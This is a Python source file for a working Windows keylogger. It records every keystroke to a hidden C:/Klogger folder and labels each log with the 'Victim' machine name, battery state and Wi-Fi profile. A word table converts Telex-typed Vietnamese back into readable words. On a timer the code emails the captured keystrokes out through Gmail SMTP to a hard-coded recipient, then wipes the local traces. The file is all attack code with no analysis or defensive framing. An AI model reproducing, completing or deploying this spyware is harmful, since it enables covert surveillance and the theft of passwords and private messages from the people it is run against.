#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import urllib
import os.path
from os import path
import socket 
from datetime import datetime
import psutil
import subprocess
import codecs
import requests
import numpy as np
def readfile():
    if(path.exists("C:/Klogger")==False):
        os.mkdir('C:/Klogger/')
    object = open("C:/Klogger/loggerReplace.txt" ,"a")
    object.close()
    string = ""
    f= codecs.open("C:/Klogger/loggerReplace.txt",'r',"utf8") 
    for line in f:
        string = string + line +"\n"
    return string
def internet_on():
    url='http://www.google.com/'
    timeout=5
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        return False
    return False
def replaceWord(word):
    Wr =[  ["mệt","meetj","meetjt","metej"],["ghê","ghee"],["á","as"],["biết","bieetst"],["gì","gif"],["đâu","ddaau"],["đây","ddaay"],["bản","banrn"],["dậy","ddaayjy"],["tối","tooisi"],["mấy"," maaysy"],["dương","duongwng"],["nhật","nhaatjt"],["hào","haofo"],["bằng","bangwngfng"],["vô","voo"],
            ["phát","phatst"],["quá","quas"],["chán","chánn"],["luôn","luoon"],["vậy","vaayjy"],["đó","ddos"],["nó","nos"],["làm","lafm","lamf","lamfm"],["kệ","keej"],["đồ","ddoof"],["án","ansn"],["cuối","cuooisi"],["kì","kif"],["là","laf"],["như","nhuw"],["thế","thees"],
            ["nào","naofo"],["một","mootjt"],["số","soos"],["toán","toansn"],["hãy","hayxy"],["viết","vieetst"],["ví","vis"],["dụ","duj"],["cụ","cuj"],["thể","theer"],["vựng","vungwngjng"],["tiếng","tieengsng"],["tàn","tanfn"],["được","dduocwcjc"],["các","cacsc"],
            ["bạn","banjn"],["đừng","ddungwngfng"],["phân","phaan"],["tích","tichsch"],["lớp","lopwpsp"],["tương","tuongwng"],["đương","dduongwng","duongwngdng","duongduongwng"],["thông","thoong"],["thường","thuongwngfng"],["bán","bansn"],["thời","thoiwifi"],
            ["hình","hinhfnh"],["không","khoong","khongong"],["người","nguoiwifi"],["hỏi","hoiri"],["mình","minhfnh"],["nè","nef"],["rán","rasn"],["thôi","thooii","thooi"],["thầy","thaayfy"],["ơi","oiwi"],["giá","gias"],["trị","trij"],["viên","vieen"],
            ["lỗi","looixi"],["xãy","xayxy"],["ở","owr"],["những","nhungwngxng"],["mạnh","manhjnh"],["gọi","goiji"],["mười","muoiwifi"],["chín","chinsn"],["tám","tamsm"],["bảy","bayry"],["sáu","sausu"],["năm","namwm"],["bốn","boonsn"],["thuê","thuee"],
            ["chưa","chuwa"],["điểm","ddieemrm"],["thì","thif"],["nói","noisi"],["mèo","meofo"],["chó","chó"],["hưu","huwu"],["vượn","vuonwnjn"],["xàm","xamfm"],["đi","ddi"],["rãnh","ranhxnh"],["có","cos"],["hả","har"],["nhảm","nhamrm"],
            ["nhí","nhis"],["gửi","guiwiri"],["với","voiwisi"],["cám","camsm"],["ơn","onwn"],["nhìu","nhiufu"],["ê","ee"],["â","â"],["ă","ă"],["ơ","ow"],["ô","ô"],["ừm","uwmfm"],["rãnh","ranhxnh"],["đang","ddang"],["hú","hus"],["nản","nanrn"],
            ["hết","heetst"],["bộ","booj"],["đếm","ddeemsm"],["từ","tuwf"],["ngôn"," ngoon"],["ngữ","nguwx"],["văn","vanwn"],["học","hocjc"],["hành","hanhfnh"],["lễ","leex"],["tiên","tieen"],["hậu","haauju"],["trễ","treex"],["còn","confn"],["thử","thuwr"],
            ["nhớ","nhows"],["lời","loiwifi"],["hứa","huwasa"],["ngày","ngayfy"],["xưa","xuwa"],["bên","been"],["dưới","duoiwisi","duowisi"],["ánh","anhsnh"],["trăng","trangwng"],["đã","ddax"],["nguyện","nguyeenjn"],["thề","theef"],["tràn","tranfn"],
            ["thề","theef"],["chán","chansn"],["thiệt","thieetjt"],["ráng","rangsng"],["phút","phutst"],["nữa","nuwaxa"],["bây","baay"],["giờ","giowf"],["cần","caanfn"],["c*c","cacwcjc"],["bú","bus"],["chào","chaofo","chafo"],["cái","caisi","cais"],["nhập","nhaapjp","nhaajp"],["nhẹ","nhej"]
        ]
    for i in range(0,len(Wr)):
        if Wr[i][0] == None :
            break
        if word in Wr[i]:
            return Wr[i][0]
    return word
def replaceFile():
    if(path.exists("C:/Klogger")==False):
        os.mkdir('C:/Klogger/')
    object = open("C:/Klogger/logger.txt" ,"a")
    object.close()
    string = ""
    f= open("C:/Klogger/logger.txt",'r') 
    text =  strg = "Victim : "+getNamePC()
    for line in f :
        lineR = ""
        lineS = line.split()
        for word in lineS :
            lineR = lineR +" "+replaceWord(word)
        text = text+"\n"+lineR
    if(path.exists("C:/Klogger")==False):
        os.mkdir('C:/Klogger/')
    object2 = codecs.open("C:/Klogger/loggerReplace.txt" ,"a",encoding="utf8")
    object2.write(" "+text)
    text = ""
    object2.close()
def checkWifiConnection():
    string  = str(subprocess.check_output("netsh wlan show interfaces"))
    start = str(subprocess.check_output("netsh wlan show interfaces")).find("Profile")
    string = string[start:len(string)]
    s=""
    for i in range(0,len(string)): 
        if (string[i] == "\\" ):
            return s
        s = s+string[i]
    return s
def getBatteryStatus():
    battery = psutil.sensors_battery()
    plugged = battery.power_plugged
    percent = str(battery.percent)
    if plugged==False: plugged="Not Plugged In"
    else: plugged="Plugged In"
    return str(percent+'% | '+plugged)
def getTime():
    now = datetime.now() # current date and time
    year = now.strftime("%Y")
    month = now.strftime("%m")
    day = now.strftime("%d")
    time = now.strftime("%H:%M:%S")
    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
    return date_time
def getNamePC():
    string = "Unknown"
    try:
        string = socket.gethostname()
    except AttributeError:
        return "Uknown"
    return string
class Keylogger:
    def __init__(self, time_interval, email, password ):
        if(path.exists("C:/Klogger")==False):
            os.mkdir('C:/Klogger/')
        self.finalog = "\nStarted at " +getTime()+"\n"+"Victim_name: "+getNamePC()+"\nStatus : "+getBatteryStatus()+"\nWifi : "+checkWifiConnection()
        object = open("C:/Klogger/logger.txt" ,"a")
        object.write(self.finalog)
        self.interval = time_interval
        self.email = email
        self.password = password
    def append_to_log(self, string):
        if(path.exists("C:/Klogger")==False):
            os.mkdir('C:/Klogger/')
        object = open("C:/Klogger/logger.txt" ,"a")
        object.write(string.encode("ascii", errors="ignore").decode())
        object.close()
    def process_key_press(self, key): #call back function
        try:
            current_key =  str(key.char)
        except AttributeError:
            if key == key.space:
                current_key =  " "
            elif (str(key) == "Key.enter"):
                current_key =   "\n"+getTime()+" "
            elif (str(key) == "Key.backspace"):
                current_key =   ""
            elif (str(key) == "Key.delete"):
                current_key =   "[delete]"
            else :current_key = ""
        self.append_to_log(current_key)
   
    def report(self):
        if os.stat("C:/Klogger/logger.txt").st_size != 0 :
            replaceFile()
            self.finalog =  readfile()
            self.finalog.encode()
            # self.send_mail(self.email, self.password, getNamePC())
            if(internet_on()):
                self.send_mail(self.email, self.password, self.finalog)
                object1 = open("C:/Klogger/loggerReplace.txt" ,"w")
                object1.write("")
                object1.close()
            object = open("C:/Klogger/logger.txt" ,"w")
            object.write("")
            object.close()
            self.finalog=""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email, "received_email@gmail.com", message.encode("utf8"))
        server.quit()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    